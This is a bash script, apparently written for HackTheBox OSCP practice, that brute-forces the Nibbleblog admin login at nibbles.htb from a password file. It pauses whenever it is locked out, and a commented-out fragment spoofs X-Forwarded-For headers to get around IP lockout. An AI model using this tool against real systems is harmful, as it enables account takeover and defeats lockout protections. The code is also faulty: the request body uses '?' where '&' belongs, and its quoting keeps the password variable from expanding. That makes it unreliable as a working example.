  _    _ _______ _______ _____    ____  _____  _    _ _______ ______  
 | |  | |__   __|__   __|  __ \  |  _ \|  __ \| |  | |__   __|  ____| 
 | |__| |  | |     | |  | |__) | | |_) | |__) | |  | |  | |  | |__    
 |  __  |  | |     | |  |  ___/  |  _ <|  _  /| |  | |  | |  |  __|   
 | |  | |  | |     | |  | |      | |_) | | \ \| |__| |  | |  | |____  
 |_|  |_|  |_|   __|_| _|_|    __|____/|_|  \_\\____/   |_|  |______| 
 | |            / ____(_) |   |  __ \                  | |            
 | |__  _   _  | |  __ _| |__ | |__) |_ _ _ __ __ _  __| | _____  __  
 | '_ \| | | | | | |_ | | '_ \|  ___/ _` | '__/ _` |/ _` |/ _ \ \/ /  
 | |_) | |_| | | |__| | | |_) | |  | (_| | | | (_| | (_| | (_) >  <   
 |_.__/ \__, |  \_____|_|_.__/|_|   \__,_|_|  \__,_|\__,_|\___/_/\_\  
         __/ |                                                        
        |___/                                                         
        
#A tool developed for use of HTB for traiing for the OSCP 2020 was desinged with account lockout in mind this script delyays its login attempts        
#!/bin/bash
ip=0
while read p; do
	echo -ne "Trying $p          \r"
	((ip++))
	ip=$(($ip % 255))
	r=$(curl -s -X POST http://nibbles.htb/nibbleblog/admin.php -d 'username=admin?password=$p') # -A $p --header "X-Forwarded-For: 10.10.14.$ip")
	if [[ "$r" != *"Incorrect"* ]]; then
		if [[ "$r" != *"Blacklist"* ]]; then
			echo "$p seems to work"
			break
		else
			echo "Locked out. Waiting 60 secs..."
			for w in {0..60}
			do 
				echo -ne "$w\r"
				sleep 1
			done
		fi
	fi
done < pwds.txt        
        
